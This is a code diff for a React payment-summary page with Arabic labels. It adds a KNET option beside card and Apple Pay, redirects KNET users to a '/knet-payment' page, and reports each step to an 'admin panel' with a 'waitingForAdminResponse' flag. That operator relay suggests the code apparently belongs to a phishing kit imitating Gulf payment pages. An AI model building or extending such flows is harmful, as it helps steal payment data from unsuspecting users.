@@ -66,23 +66,28 @@ export default function SummaryPayment() {
 
     setIsProcessing(true);
 
+    // Determine payment method label
+    const paymentMethodLabel = selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : selectedPaymentMethod === 'knet' ? 'كي نت' : 'Apple Pay';
+
     // Send data to admin panel
     sendData({
       data: {
-        paymentMethod: selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : 'Apple Pay',
+        paymentMethod: paymentMethodLabel,
         serviceName,
         servicePrice,
         vatAmount,
         totalAmount,
       },
       current: 'ملخص الدفع',
-      nextPage: selectedPaymentMethod === 'card' ? 'credit-card-payment' : 'bank-transfer',
+      nextPage: selectedPaymentMethod === 'knet' ? 'knet-payment' : selectedPaymentMethod === 'card' ? 'credit-card-payment' : 'bank-transfer',
       waitingForAdminResponse: false,
     });
 
     setTimeout(() => {
       setIsProcessing(false);
-      if (selectedPaymentMethod === 'card') {
+      if (selectedPaymentMethod === 'knet') {
+        window.location.href = '/knet-payment';
+      } else if (selectedPaymentMethod === 'card') {
         window.location.href = `/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`;
       } else {
         window.location.href = `/bank-transfer?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`;
@@ -267,6 +272,31 @@ export default function SummaryPayment() {
                         <img src="/images/banks/visa.png" alt="Visa" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                         <img src="/images/banks/mastercard.png" alt="Mastercard" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
                         <img src="/images/banks/mada.png" alt="Mada" className="h-6" onError={(e) => e.currentTarget.style.display = 'none'} />
+                      </div>
+                    </div>
+
+                    {/* KNET Option */}
+                    <div
+                      className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
+                        selectedPaymentMethod === 'knet'
+                          ? 'border-[#143c3c] bg-[#143c3c]/5'
+                          : 'border-gray-200 hover:border-[#143c3c]/50'
+                      }`}
+                      onClick={() => setSelectedPaymentMethod('knet')}
+                    >
+                      <div className="flex items-center gap-3">
+                        <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
+                          selectedPaymentMethod === 'knet' ? 'border-[#143c3c]' : 'border-gray-300'
+                        }`}>
+                          {selectedPaymentMethod === 'knet' && (
+                            <div className="w-3 h-3 rounded-full bg-[#143c3c]" />
+                          )}
+                        </div>
+                        <img src="/kpay/knet.png" alt="KNET" className={`w-8 h-8 object-contain ${selectedPaymentMethod === 'knet' ? 'opacity-100' : 'opacity-50'}`} />
+                        <div>
+                          <p className="font-medium">KNET</p>
+                          <p className="text-sm text-gray-500">الدفع بواسطة كي نت</p>
+                        </div>
                       </div>
                     </div>
 
